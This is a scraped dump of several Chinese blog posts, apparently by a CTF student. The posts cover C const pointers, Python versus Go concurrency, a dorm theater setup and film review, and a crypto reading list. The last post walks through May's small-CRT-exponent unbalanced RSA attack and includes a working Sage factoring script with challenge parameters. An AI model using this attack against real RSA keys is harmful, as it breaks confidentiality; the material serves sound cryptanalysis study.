*s=&quot;ABCDE&quot; 为什么是有问题的 前言之所以会注意到这个问题，是因为老师布置的课堂小测的一道题，原题如下： 下面能正确进行字符串赋值操作的是____。A. char s[5]={&quot;ABCDE&quot;};B. char s[5]={'A','B','C','D','E'};C. char *s;s=&quot;ABCDE&quot;;D. char *s;scanf(&quot;%s&quot;,s); 当看到答案选 B 的时候，我人傻了，因为我上网查的答案是C，纳闷着调试，结果如下： B 选项的做法不会在后面补零终止符'\\0'，此时执行printf(&quot;%s&quot;,s);会打印出ABCDE后面跟着一串乱码。C 选项的做法会在后面补零终止符，且编译器编译不报错，运行同样不报错。 此时的我更加疑惑，B 选项这不是有问题了吗？询问老师，老师给出的解释是： 题干说进行字符串赋值操作，而 C 选项是给指针赋值 这个解释离大谱。 后来在 GZTime 及 Hanmur 学长的无语点拨下，我注意到了 C 选项的一个问题。 常量指针与变量指针首先先引入常量指针与变量指针的概念，顾名思义，变量指针就是指向变量的指针，如： 12int a=0;int *p=&amp;a; 此时 a 是一个变量， p 则是一个指向变量 a 的指针，即为变量指针。而同理，常量指针是一个指向常量的指针，如： 12const int a=0;const int *p=&amp;a; 此时 a 是一个常量， p 是一个指向常量 a 的指针，即为常量指针。注意： 常量指针的声明格式为 数据类型 const * 指针变量 或者 const 数据类型 *指针变量。 变量还是常量？那么问题来了，char *s=&quot;ABCDE&quot;一句中， s 指向的字符串是常量还是变量？一个很简单的区分方式是，尝试改变字符串的字符。 1234char t[]=&quot;ABCDE&quot;;t[0] = 'F';char *s=&quot;ABCDE&quot;;s[0]='F'; 运行结果是：前两句可以正常执行，而执行第 4 句时则会弹出 Segmentation fault。对程序进行分析可以知道，char *s=&quot;ABCDE&quot;;一句会把字符串存储到只读的 rdata 段，所以无法改变其中的内容。也就是说，char *s=&quot;ABCDE&quot;一句中，s 指向的字符串是常量。 总结那么回到开始的问题，char *s=&quot;ABCDE&quot;; 为什么是错的答案是，它用一个变量指针指向了一个常量！正确的写法应为：const char *s=&quot;ABCDE&quot;;也许当你编译时不会报错，甚至运行时不去改变里面的值时也不会发生中断，但这个语句的的确确是有问题的。","link":"/2021/12/30/%E5%8F%98%E9%87%8F%E6%8C%87%E9%92%88%E6%8C%87%E5%90%91%E7%9A%84%E5%B8%B8%E9%87%8F/"},{"title":"多线程：Python VS Golang","text":"Golang 的牛皮之处 前言平时做密码题经常会用到并行计算加速爆破，但是一直没仔细研究过这方面的东西。 Python 的多线程Review: multiprocessing VS multithreading相信大家都听说过线程和进程，也相信有一部分读者跟我一样常常把它们搞混——这中文翻译得，都有一个程字就是说。操作系统是有讲过的，进程（Process）是资源分配的基本单位，线程（Thread）则是 CPU 调度的基本单位。我们再详细分析他们的区别：进程由于其资源是独立的，所以进程之间的通信需要 IPC（Inter-Process Communication）机制，比如管道、消息队列、共享内存等；而线程由于其资源是共享的，所以线程之间的通信就简单多了，直接读写共享变量就行了，创建和切换线程的开销也比进程小得多。 DeepSeek 的类比比较恰当：进程像一个“工厂”：拥有独立的场地（内存）、设备（资源）和工人（线程）。线程像工厂内的“工人”：共享工厂的资源，协作完成生产任务。多工厂（多进程）：需要复制多套场地和设备，成本高，但安全隔离。单工厂多工人（多线程）：效率高但需协调工人避免冲突。 相应地，并发和并行也是有说法的：多进程对应并行，多线程对应并发。多进程通过在不同的核上运行任务来实现并行，而多线程则是通过在同一个核上切换任务来实现并发。 为什么说 Python 的多线程是伪多线程一切都缘于 GIL（Global Interpreter Lock），也就是 Python 的全局解释器锁，作为保护访问 Python 对象的线程安全的一种机制，GIL 使得同一时刻只有一个线程在执行 Python 字节码，一个线程在执行 Python 字节码时，其他线程只能等待，即线程是交替执行的。 总结I/O 密集型任务使用多线程，CPU 密集型任务使用多进程。那为什么 I/O 密集型任务不使用多进程呢？上面已经提到，进程的开销比线程大得多，而且线程间是共享内存的，也意味的 fd 能复用，从而大大提高了 I/O 的效率。 Golang 又是怎么个事对 Golang 有一定了解的读者应该知道，Golang 是原生支持并发的，通过一个叫 Goroutine 的东西来实现。 GoroutineGoroutine 是一个轻量级线程，之所以轻量，是因为它的初始栈空间只有 2KB，而传统线程的栈空间通常需要 MB 级，这差距还是挺大的。 同时 goroutine 运行在用户态，创建和销毁的开销也比传统线程小得多。 GMP 模型Go 运行时通过 GMP 调度模型 管理 goroutine 和系统线程的映射关系： G（Goroutine）：单个协程任务，包含栈、程序计数器等信息。M（Machine）：操作系统线程（OS Thread），真正执行计算的资源。P（Processor）：逻辑处理器，管理本地 goroutine 队列（每个 P 绑定一个 M）。 ChannelChannel 是 goroutine 之间的通信管道，这也是一个神奇的点，goroutine 之间不直接共享内存，而是通过 channel 传递数据（所有权转移），天然避免并发访问冲突。这个传递数据过程是一个所有权转移的过程，一旦发送到 channel，发送方就不再持有这个数据，只被接收方独占。而且 channel 的发送和接收本身都是原子性的，不需额外加锁。但是注意这个并不是意味着它完全没有用到锁，观察其底层结构 hchan 的源码： 12345678910111213141516171819202122type hchan struct { qcount uint // total data in the queue dataqsiz uint // size of the circular queue buf unsafe.Pointer // points to an array of dataqsiz elements elemsize uint16 synctest bool // true if created in a synctest bubble closed uint32 timer *timer // timer feeding this chan elemtype *_type // element type sendx uint // send index recvx uint // receive index recvq waitq // list of recv waiters sendq waitq // list of send waiters // lock protects all fields in hchan, as well as several // fields in sudogs blocked on this channel. // // Do not change another G's status while holding this lock // (in particular, do not ready a G), as this can deadlock // with stack shrinking. lock mutex} 还是可以看到有个互斥锁的，但是这个锁是用来保护 channel 的内部状态的，与用户数据并无关系。 demo123456789101112131415161718192021222324252627282930package mainimport &quot;fmt&quot;func worker(jobs &lt;-chan int, results chan&lt;- int) { for j := range jobs { // Receive job from channel results &lt;- j * 2 // Send result to channel }}func main() { jobs := make(chan int, 100) results := make(chan int, 100) // Start 3 worker goroutines for i := 0; i &lt; 3; i++ { go worker(jobs, results) } // Send jobs to workers for j := 0; j &lt; 5; j++ { jobs &lt;- j } close(jobs) // Collect results from workers for i := 0; i &lt; 5; i++ { fmt.Println(&lt;-results) }} 这段代码非常直白，就算没有接触过 Golang 的读者也能看懂大概。make(chan int, 100) 的意思是创建一个容量为 100 的缓冲通道（Buffered channel），若为非缓冲通道则必须等待接收方准备好才能发送成功，也就是发送和接收操作必须同步发生。缓冲区采用 FIFO 的方式，先发送的先接收。 那么现在就能理解上面那段代码的调度逻辑了： 主 goroutine 创建 jobs/results channel。 3 个 worker goroutine 被调度到空闲的 P（逻辑处理器）上执行。 主 goroutine 发送任务到 jobs channel，worker 竞争接收任务。 当 channel 操作阻塞时，调度器自动切换执行的 goroutine。 // To be continued… 参考https://zm-j.github.io/2022/11/21/python-multiprocessing/https://medium.com/capital-one-tech/python-guide-using-multiprocessing-versus-multithreading-55c4ea1788cdhttps://zhuanlan.zhihu.com/p/633279726","link":"/2025/03/30/%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%9APython%20VS%20Golang/"},{"title":"宿舍影院搭建 &amp; 五刷《铃芽之旅》后的浅评","text":"越来越不务正业乐！ 前言初三时基本将宫崎骏和新海诚的电影都看了一遍，比较喜欢日本动画的风格，这次的《铃芽之旅》终于是在电影院看了，为了对比不同影院的观影效果，特意去了五次，然后，就破产了。 宿舍影院搭建之前用的显示屏是 16:9 27 英寸屏，但现在很多电影都是宽幕，在宿舍用投影仪也不现实 （其实也不是完全不现实），所以就买了一个 21:9 34 英寸的带鱼屏。因为对床开着灯会导致屏幕反光，就买了个桌帘挡着，效果就很好了。音响用的是漫步者的 R501BT，5.1声道，759RMB 入的，看到上一年双十一最低价有到 600，但本着早买早享受的原则，就不等了。桌子左边是衣柜，隔板会增强回音，导致声场不平衡，就买了块 50*50 的吸音棉，回音基本消了，还顺便起到吸光的效果。后面的两个音箱架高，可以感觉到天上的雨声。 显示屏主要看分辨率、色深、色域、色准、防蓝光、亮度、对比度、刷新率、响应时间、HDR、曲率。 分辨率这个其实没啥好讲的，越高越好，不追求带鱼屏的话直接 4K，比 1080P 和 2K(1440P) 清晰得多。 色深色深会影响颜色过渡的平滑度，一般都是 8 位，很多 10 位也是 8 位抖出来的，原生 10 位价格很高，一般人也看不出来。 色域这个比较复杂，慢慢完善。首先有个东西叫色彩马蹄图，表示人眼能分辨的全部色彩，然后显示屏的色域就是这个图的子集，一般呈三角形，常见的有 NTSC，sRGB，DCI-P3，BT.2020，一般广告宣传标的都是容积率，也就是产品色域面积是标准色域的多少，但是注意这个不是覆盖率，100% sRGB 色域容积不一定 100% 覆盖 sRGB 色域。识别方法也很简单，没标是覆盖率一律当作容积处理，超过 100% 的也必定不是覆盖率。 色准看 $\\Delta$E，越小越好，一般 2 以内就可以了，但是这个参数一般是指出厂的平均值，具体在自己收到的机子是不一定，看自己运气，不过一般人看不出色偏。而且我发现我眼镜是防蓝光的，戴上看屏幕色温明显升高，有空还是去配个普通镜片吧。至于校色，一般没必要，几百的红蜘蛛测普通屏幕也测不准，正经校色都要十万往上的设备。 防蓝光优先硬件级防蓝光，没写就是软件级。 亮度这个高当然好，但比较看个人需求。我这个显示屏是 350 nit，宿舍里没有阳光直射，开 70% 都绰绰有余。 对比度就是最白和最黑时亮度的比值，一般 VA 屏的对比度要高点，如果不打游戏就直接 VA 屏，对比度会比较高，4000:1 以上比较好了。主要还是看原生对比度，所谓动态对比度就是通过调整背光亮度来实现的，我直接关掉背光，那动态对比度就是无穷大了，参考价值不大。 刷新率这个有点曾经沧海难为水的，如果用过了高刷就回不来了，就算不打游戏，窗口的最大最小化也能看出来高刷很自然而低刷有明显卡顿。如果是办公的话 144 Hz 就行了，再往上也体现不出来。 响应时间游戏方面比较需要这个，办公的话就不用太在意。一般选 IPS 屏响应时间会好点，但是 IPS 屏一般漏光会比较严重，意思就是就算放一张全黑的图片显示屏的边缘也会有光，这个是 LED 屏的通病，要么买会烧屏的 OLED，富哥可以考虑 Micro LED。 HDRHDR10 基本没啥效果的，折腾不好搞成负优化了还不如 SDR，建议不要管。 曲率一般大屏曲一点是好的，有环绕感，边上也不会太远产生虚焦。不信你去影院看，银幕也是弧面的。 投影仪虽然现在的体验已经相当不错了，但是谁能拒绝巨幕呢？ 光源传统光源是灯炮，然后是 LED，然后是激光光源。推荐三色激光，色彩、对比度、亮度都能打，某品牌的 LED 还在吹，不要上当。目前的三色激光只有散斑和色散的问题，但是从我个人体验来说，选择最优的解决方案后，观影的时候是完全感觉不出来的，完全没有某品牌黑到不能用的程度。光峰的 ALPD5.0 年底应该能出新机，说是能解决散斑和色散的问题，这样三色就是完美技术了，期待一手。 显像芯片DMD，LCOS，LCD。 音响2.1 就是左右音箱加一个低音炮，5.1 就是左右音箱加一个中置音箱加一个低音炮加两个环绕音箱，7.1 不是富哥又没需求的话不建议买，因为音源也少，用不着。如果会产生驻波可以考虑加低频陷阱或者用双炮，当然你如果像我一样也在宿舍用就别花那个劲做声学处理了。 影院对比 数字 IMAX头两次都是在金逸影城（深圳光明区大仟里店）看的，基本只顾着看剧情了，所以观影效果基本忘了。第三次在 CINESKY 新天影院（深圳龙华区壹方天地店），只记录这个。体验：第一反应就是银幕很大（但是走近看也不会明显看到像素点，如果《铃芽之旅》是 4K 片源的话那我觉得现在 8K 电视完全就是没必要了），工作人员服务也好，指引招呼都很热情，里面的声学设计也很不错，吸音棉沟壑多，错落有致，保持美观的同时总体声场很好。唯一缺点：票有点贵。 二代 IMAX影院：万达影院（深圳龙岗万达广场 IMAX 激光店）体验：去的是早上 10 点的场，检票员都还没来上班，理论上可以随便进，进到里面也没人，算是我包场了，乐。银幕较小，亮度与数字 IMAX 相比看不出有明显区别，12.0 声道，但是天空声道听不出声音，基本可以判断《铃芽之旅》是 5.0 声道片源。 杜比影院影院：万象影城（深圳罗湖万象城店）体验：首先这是我第一次去万象城，对我这种乡巴佬来说非常不适应，全是卖奢侈品的，几乎所有店名都是英文，一家吃的也没，最后实在赶时间，花 38 买了一桶爆米花，纯纯大冤种。影院排场过密，开场前 10 分钟才给进。杜比视界的对比度确实高，黑的地方很黑，银幕边缘基本不会像 IMAX 厅有类似显示屏漏光的现象，亮度对比 IMAX 也稍有提高。但是影院似乎把音量调小了，《铃芽之旅》关门的情节中，上锁的声音最后会有一声极为高频的清鸣，在 IMAX 厅感觉非常明显，但在这个厅没有，给人的感觉就没那么燃，隔音也没做好，时不时会传来隔壁影院的低音振动。此外，我坐的位置观影时能看到左右两边有非常亮的安全出口绿光，十分影响观影体验，如果能往前坐一排的话应该不会有这个问题。 总结：2D 电影基本都可以在数字 IMAX 厅或杜比影院看，激光 IMAX 应该只有在 3D 电影才会体现出亮度优势。 浅评《铃芽之旅》第一次比较认真地鉴赏电影，感觉还是挺有意思的。期间也看了很多关于《铃芽之旅》的评论，很多都是不加思考的主观臆断，并不是说电影没有问题，每个人都可以有其对作品的理解和看法，但没有依据地一味批评显得十分无脑，只能说可能是短视频刷多了，遇到需要思考的东西就回避，直接贴上一个“逻辑混乱”的标签掩饰自己的懒惰。在我看来，电影和阅读理解一样，很难说一遍就能读透的，赏析时也不能光写观点而不给理由。首先我觉得最不合适的就是分类在爱情片里，《铃芽之旅》的爱情线虽然勉强算是完整，但着笔确实太少，只能说能圆上，其中最大的问题在于对草太的人物刻画十分单薄，两人的独处篇幅也少。其次这个电影并不是逻辑混乱的，当然也不能说逻辑十分完整。第一遍看的时候我也很懵，但后来越看越合理，许多情节都是伏笔。这里给出几个我的观点，仅供参考。 铃芽真的是恋爱脑吗？首先我们要知道一个设定，那就是铃芽的母亲是在 311 地震中丧生的，这带给铃芽很大的打击，电影开头里，铃芽梦见她小时候在常世找妈妈，表明铃芽对母亲的逝去始终无法释怀。我认为铃芽一开始带草太回家一方面是因为她跟随母亲当护士的职业操守，一方面自然是好奇。铃芽跟着草太和大臣一起上船也不难理解，椅子是她妈妈留下的遗物，总不能不管吧。 黄蝴蝶的含义是什么？我比较赞同黄蝴蝶是铃芽母亲的说法。如果说前面只是普通的暗示，那么电影结尾铃芽看着小时候的自己，哭着说“妈妈，我该怎么办”时，黄蝴蝶围着椅子飞，给她指明方向时，就是新海诚明着说这就是铃芽妈妈了。 东京的要石是被谁拔出的？我的猜测是大臣拔出的，作案动机我也不能十分揣测明白，但是作案时间是具备的，大臣消失了一会蚓厄就爆发了。 其他的小细节： 三部曲都有人抽烟，《你的名字》是奥寺，《天气之子》是大叔，《铃芽之旅》是芹泽。 游乐场的往门能进去。 千果为了搭铃芽去废弃的学校，橙子都没带上车。 铃芽房间里的《看护师》给了两次镜头，第一次是草太到房间里的时候，第二次是结尾，表明铃芽也继承了母亲的职业。 草太坠落时的背景是燃烧的常世。","link":"/2023/04/19/%E5%AE%BF%E8%88%8D%E5%BD%B1%E9%99%A2%E6%90%AD%E5%BB%BA%20&%20%E4%BA%94%E5%88%B7%E3%80%8A%E9%93%83%E8%8A%BD%E4%B9%8B%E6%97%85%E3%80%8B%E5%90%8E%E7%9A%84%E6%B5%85%E8%AF%84/"},{"title":"密码学论文记","text":"记录一下读的 Papers 常见词汇devise 发明permutation 置换reciprocal 倒数cardinality 基数corollary 推论canonica 规范的symmetric 对称的determinant 行列式regarding 关于map 映射projection 投影coordinate 坐标denote 标示rational 有理的thus 因此alternatively 或者optimize 优化anew 重新tedious 乏味的non-trivial 不平凡的derive 得到hence 因此composite number 合数or else 否则scenario 方案implicit 隐式的analogous 相似的asymptotical 渐进的sake 目的notation 符号 文章汇总1. Cryptanalysis of Unbalanced RSA with Small CRT-Exponent第一篇正经详细读的论文，作者 Alexander May 挺 nb 的，多元 coppersmith 也是他和另一个人写的，有机会也读一下。这篇 paper 主要讲 $p$ 和 $q$ 不平衡时的 RSA 攻击，还要满足 $d_p$ 足够小。具体如下：$$\\beta = q_{bits}/n_{bits} \\\\\\delta = d_{p_{bits}}/n_{bits} \\\\s.t. \\enspace 3\\beta &lt; 1+\\beta^2+2\\delta$$ 2. Modulus Fault Attacks Against RSA-CRT Signatures3. Merkle-Hellman Revisited: A Cryptanalysis of the Qu-Vanstone Cryptosystem Based on Group Factorizations4. A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants攻击汇总之前在 GitHub 上看到的一个很全的攻击汇总，记录下。 Approximate Common DivisorCBCCBC + CBC-MACCTRECBElliptic Curve CryptographyElGamal EncryptionElgGamal SignatureFactorization已知部分 p 和 q已知部分 p, q 和 d已知部分 p, q, d, dp 和 dq已知部分 p已知 phi孪生素数（这个稍微有点逊）$p &gt; q^3$ 且已知部分 p GCMHidden Number ProblemIGEKnapsack CryptosystemsLinear Congruential GeneratorsLearning With ErrorsMersenne TwisterOne-time PadPseudoprimesRC4RSAShamir’s Secret Sharing","link":"/2022/08/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AE%BA%E6%96%87%E8%AE%B0/"},{"title":"小 CRT 指数非平衡 RSA 的密码分析论文分析","text":"直接读头晕，翻译更看不懂，就写篇文一点点细啃吧。 前言第一次认真看英文论文，也是第一次看论文。这篇是 NSSCTF 中 Crypto 题的出题论文，题目非常简单，但是零解（）后来在 Destog3 迎新赛的压轴题又看到了几乎一样的题，照着 NSSCTF 的 wp 改了下参数中跑出来了，既然在短时间内能碰见两次，也是缘分，就读读罢。 论文翻译引言论文中写到 $ed=1\\mod\\frac{(p-1)(q-1)}{2}$ （这个我没见过），然后 $ \\gcd(p-1,\\frac{q-1}{2})=1$ ，再然后由CRT给出 $ed=1\\mod p-1$ 且 $ed=1\\mod\\frac{q-1}{2}$ 。为了加速 RSA 的解密，有人想用小解密指数 $d$ ，然而 Wiener 先生指出 $d&lt; \\frac{1}{3}N^{\\frac{1}{4}}$ 时可以在多项式时间内爆破出来。虽然不能使用小解密指数 $d$ ，但还有一个方法，就是计算 $d_p=d\\mod p-1$ 和 $d_q=d\\mod \\frac{q-1}{2}$ 是比较小的，这样一个 $d$ 称为小CRT指数。为了对消息 $m$ 进行签名，可以计算 $m^{d_p}\\mod p$ 和 $m^{d_q}\\mod q$ ，在之前，由于 $d$ 看起来是比较大的，所以也没法攻击（意思应该就是现在可以了）。攻破这个系统的最优的算法的时间复杂度在 $O(\\min(\\sqrt{d_p},\\sqrt{d_q}))$ ，同时有趣的是， $p$ 和 $q$ 不平衡时往往会降低 RSA 的安全性。令 $q &lt; N^\\beta$ 且 $d_p \\le N^\\delta$ ，当满足 $3\\beta + 2\\delta \\le 1 - \\log_N(4)$ 时可以在 $O(\\log^2(N))$ 复杂度内分解 $N$ ，显然，这个方法只能在 $\\beta &lt; \\frac{1}{3}$ 时有效。关键部分来了，这里说到，文章中给出了一种构造任意维度的格的方法来将条件提升到 $3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon$ ，这个 $\\epsilon$ 是一个小错误的意思（我也不知道干嘛的）。因此只要 $\\beta &lt; \\frac{3-\\sqrt{5}}{2}=\\hat{\\phi}^2$ ，这个方法就是有效的，当 $\\hat{\\phi}$ 时是黄金比例的共轭（这一段我又不知道在干嘛了）。 准备工作记模 $N$ 环为 $\\mathbb {Z}_N$ ，整数模 $N$ 乘法群为 $\\mathbb{Z}^*_N$ 真相1（原文就叫Fact 1，随便翻译意思一下）$(Lenstra, Lenstra and Lov´asz)$令 $L$ 为一个由 ${v_1,…,v_n}$ 张成的格，那么 $L^3-reduction$ 算法可以在多项式时间内输出一个以 ${v_1^\\prime,…,v_n^\\prime}$ 为基的格且这组基满足$$ |v_1^\\prime| \\le 2^{\\frac{n-1}{4}} \\ det(L)^\\frac{1}{n} \\ and \\ |v_2^\\prime| \\le 2^{\\frac{n}{2}} \\ det(L)^\\frac{1}{n-1}$$ 用 CRT 生成 Key一个模 $p$ 的方法同余式改写等式过程如下：$$ ed_p=1 \\mod p-1 \\\\ ed_p+k(p-1)=1 \\ over \\ \\mathbb{Z} \\\\ ed_p-(k+1)=-kp$$下面假设 $q$ 不整除 $k$ ，否则右式是 $N$ 的倍数然后我们可以获得更强的结果（又是奇怪的翻译），等下再讨论这个。此时有多项式$$ f_p(x,y)=ex-y$$且该多项式有一根 $(x_0,y_0)=(d_p,k+1) \\ modulo \\ p$构造时我们有 $d_p \\le N^\\delta$ ，又 $e &lt; \\frac{(p-1)(q-1)}{2}$ ，就有$$ \\lvert k+1\\rvert=\\lvert \\frac{ed_p-2}{p-1}\\rvert &lt; \\frac{ed_p}{p-1} &lt; \\frac{q-1}{2}d_p &lt; N^{\\beta + \\delta}$$定义两个上界 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ ，则模二元多项式方程 $f_p$ 有一个小根 $(x_0),y_0$ 满足 $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ ，这个模方程可以用 Howgrave_Grahm 定理转变为一个整数上的方程。 真相2 $(Howgrave-Graham)$令 $f(x,y)$ 为一个至多 $\\omega$ 个单项式的和的多项式，假定 $f(x_0,y_0)=0\\mod \\ p^m$ ( $m$ 为正整数)， $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ 。若 $|f(xX,yY)| &lt; \\frac{p^m}{\\sqrt{\\omega}}$ ，则 $f(x_0,y_0)=0$ 在整数上成立。 用格约化算法可以找到一个小欧里几得范数的多项式 $f(xX,yY)$ ，第一个方法是构造一个二维的格，这时高斯约化算法可以找到一个最短向量。我们选择 $m=1$ ，然后我们使用同样含根 $x_0 \\ modulo \\ p$ 的辅助多项式 $f_0(x)=Nx$ ，因为 $N$ 是 $p$ 的倍数。因此， $f_0$ 和 $f_p$ 的每个整数线性组合都有根 $(x_0,y_0) \\ modulo \\ p$ 。此时构造一个由多项式 $f_0(xX)$ 和 $f_p(xX,yY)$ 的系数向量张成的格 $L_p$ 。这些系数向量是如下 $(2x2)$ 格基矩阵 $B_p$ 的行向量$$B_p=\\begin{bmatrix} NX \\\\ eX &amp; -Y\\end{bmatrix}$$然后找到一个向量 $v$ 使其欧里几得范数小于 $\\frac{p}{\\sqrt{2}}$ ，这个向量可以被转换成一个满足真相2的多项式 $f(x,y)$ 。 引理3 令 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ 满足$$ 3\\beta + 2\\delta \\le 1 - log_N(4)$$则 $L_p$ 有一个最小向量 $v$ 满足 $|v|&lt;\\frac{p}{\\sqrt{2}}$证明 由 Minkowski 定理，…呃先不说这个，能用就行（逃 通过引理3，我们知道，对每个固定的 $\\epsilon &gt; 0$ ，条件 $3\\beta + 2\\delta \\le 1 - \\epsilon$ 有适当的模量 $N$ （这里我感觉不应该是这么翻译，后面再改）。假定我们通过格约化找到了一个 $L_p$ 中的向量 $v$ ，其范数小于 $\\frac{p}{\\sqrt{2}}$ ，令 $v$ 为多项式 $f(xX,yY)$ 的系数向量，应用真相2，我们知道 $f(x,y)$ 在整数上有一根 $(x_0,y_0)=(d_p,k+1)$ ，下一个定理将表明这个根可以很容易被找到。 引理4 令 $v=(c_0,c_1)\\cdot B_p$ 为 $L_p$ 的最短向量且满足 $|v|&lt;\\frac{p}{\\sqrt{2}}$ 则 $\\lvert c_0 \\rvert = k$ 且 $\\lvert c_1 \\rvert = qd_p$证明 略 总结如下结论就有如下定理： 定理5 给定一个 RSA 公钥对 $(N,e)$ ，令 $q&lt;N^\\beta,d_p \\le N^\\delta$ 且$$ 3\\beta + 2\\delta \\le 1 - log_N(4)$$则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。证明 还是略（ 在之前的分析中，我们假设 $q$ 不整除 $k$ ，特殊情况下若 $k=qr$ ( $r \\in \\mathbb{Z}$ )，我们得到了类似于以下更强结果之前的推理（百度翻译的） 定理6 给定一个RSA公钥对$(N,e)$，令$q&lt;N^\\beta,d_p \\le N^\\delta$且$$ k=qr \\ and \\ 3\\beta + 2\\delta \\le 1 - log_N(4)$$则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。证明 又双叒叕是略（ 有趣的是，在定理 6 中选择 $\\beta=\\frac{1}{2}$ 会有一个界 $\\delta \\le \\frac{1}{4}-log_N(4)$ ，这与 Wiener 的界差不多。 将界提升到 $\\beta &lt; N^{0.382}$这里将界提升到 $\\beta &lt; \\frac{3-\\sqrt{5}}{2} \\approx N^{0.382}$ 。上面我们使用真相2的时候选择 $m=1$ ，现在一般化方法到任意 $m$ 。定义 $x$ 移位多项式（这个也是百度翻译）$$ g_{m,i,j}(x,y)=N^{max(0,m-j)}x^if^j_p(x,y)$$注意到，每个多项式 $g_{m,i,j}$ 的线性组合都有零点 $(x_0,y_0)=(d_p,k+1)\\ modulo \\ p^m$ 。确定一个格维数 $n$ ，然后用 $g_{m,i,j}(xX,yY)$ 的系数向量来构造一个 $n$ 维格 $L_p$ ，其中 $j=0…n-1$ ， $i=n-j-i$ 。参数 $m$ 是 $n$ 的函数且须进行优化。比如选取 $n=4$ ， $m=2$ ，格 $L_p$ 由如下行向量张成$$B_p=\\begin{bmatrix} N^2X^3 \\\\ eNX^3 &amp; -NX^2Y \\\\ e^2X^3 &amp; -2eX^2Y &amp; XY^2 \\\\ e^3X^3 &amp; -3e^2X^2Y &amp; 3eXY^2 &amp; -Y^3\\end{bmatrix}$$注意到，之前的 $L_p$ 和这里的 $L_p(2)$ 是一样的。为了满足真相2，我们一个满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 系数向量 $v$ ，如下引理给出了一个找这样一个向量的条件 引理7 对每个确定的 $\\epsilon&gt;0$ ，令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ 满足$$ 3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon$$然后用 LLL 算法可以在 $L_p(n)$ 中找到一个向量 $v$ 满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 。证明 略（ 现在我们可以用上面的引理7与真相2结合来构造一个次数为$n$的双变量多项式 $f(x,y)$ ，该多项式最多由 $n$ 个单项式组成，有一根 $(x_0,y_0)$ ，现在问题来到如何提取根 $(x_0,y_0)$ 。与引理4类似，等下写这 引理8 令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ ，多项式 $f_p(x,y)=ex-y$ 有一根 $(x_0,y_0)\\ modulo \\ p$ 满足 $\\lvert x_0 \\rvert \\le N^\\delta$ ， $\\lvert y_0 \\rvert \\le N^{\\beta +\\delta}$ ，令 $v$ 为 $L_p(n)$ 中范数小于 $\\frac{p^m}{\\sqrt{n}}$ 的向量（ $v$ 为项式 $f(xX,yY)$ 的系数向量），然后多项式 $p(x,y)=y_0x-x_0y \\in \\mathbb{Z}$ 一定整除 $f(x,y)$ ，我们就可以通过在 $\\mathbb{Z}[x,y]$ 上分解 $f$ 找到 $p$ 。证明 略（ 总结这些结论，就有如下定理： 定理9 给定一个 RSA 公钥对 $(N,e)$ ，令 $q &lt; N^\\beta,d_p \\le N^\\delta$且$$ 3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon$$其中对于适当大的 $N$ （啥叫适当大）， $\\epsilon&gt;0$ 任意小，则我们可以在 $log(N)$ 确定的时间多项式内分解 $N$ 。证明 略（ 一个模 $e$ 的方法好像没啥用？？？不写了 方法间的比较懒得写了（逃 实现Section31234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!sagedef attack(N, e, beta, delta): N = int(N) e = int(e) if 3*beta+2*delta &gt; 1-log(4, N): print('[-] Attack failed') return None else: X = int(pow(N, delta)) Y = int(pow(N, (beta+delta))) Bp = matrix(ZZ, [[N*X, 0], [e*X, -Y]]) print('[+] LLL reduction...') sv = Bp.LLL()[0] c = sv*Bp ^ -1 c1 = -abs(c[0]) # k c2 = abs(c[1]) # q*dp q = abs((e*c2+c1*N)//(c1+1)) p = N//q print('[+] Attack successed') print('[+] p = {}'.format(p)) print('[+] q = {}'.format(q)) return p, qif __name__ == '__main__': # from random import * # qbits = 900 # pbits = 3138 # dpbits = 66 # print('[+] Generating parameters...') # p = random_prime(2 ^ pbits) # q = random_prime(2 ^ qbits) # dp = random_prime(2 ^ dpbits) # while True: # d = (p - 1) * (randint(1 &lt;&lt; 895, 1 &lt;&lt; 905)) + dp # if GCD(d, (p - 1) * (q - 1)) == 1: # break # e = pow(d, -1, (p - 1) * (q - 1)) # N = p * q # Nbits = int(N).bit_length() # beta = qbits/Nbits # delta = dpbits/Nbits # print('[+] N = {}'.format(N)) # print('[+] e = {}'.format(e)) # print('[+] beta = {}'.format(beta)) # print('[+] delta = {}'.format(delta)) N = 634629908805216799355967956917035397016752766546070169887547308032924761760891699780399214796824214567267154390070522978483366198289411019582748412313710079216359358255867558259121819712947017660972562997658767364245468900343296627500215831311492976020519937654664907394551244233281196085084301881491720946011495516095312100438461444736650645875530160635314476776379821792685906378511085849924665878291761636238890281686290340422138558891124650561389417569572198766305774737557276999432569512459279457704718190818264594575715474945778743504600307881900481338218715405869829242732728780155929040869667117191128487515003629576385308251284254186650906711925117856043812344169291478611645877809590138625462171489233257786403238243625811812424843820945935661305236547254826569192218598933115538295435575896652227458056744204696170806637821332028265957534034435423213071725773547809761130059315592010070432661283749890121832768362711638162670468266766356808625866527581349441814512302739394082651200775637526523353517769267014266507198162521714133402947845712189448974860772495360651769766890958881349140536387282266034095164827944286428551415655867359896643466364963634800962833486281066681776967479689689507887525855059 e = 2224497294943466667569924606077617950816273314086331951582070678013065653291476815108986580303875082420702271437658931755138901664517778664519780647217783542023417505189992135296063543278945023934496645349482117892944997204053051479509046920859567697220647995134853975042510912947846558285607488485693658440481620381159775083837924267557018355640724244474392436574398726044114308424040372798226726894995200525970086249523687110359988773391778344480614860652625194423038827872420382525032529102545361790334952487889916589728946665519779620646046510510564208183288400340500644456996410443772074221454340761804247575702419665153338605230208880953634028122102333311610154730086600904431489837421644135325871256637779426372304718406117876512852275289537239736687624322416344880085595784592895161314552212461603899337551487742330189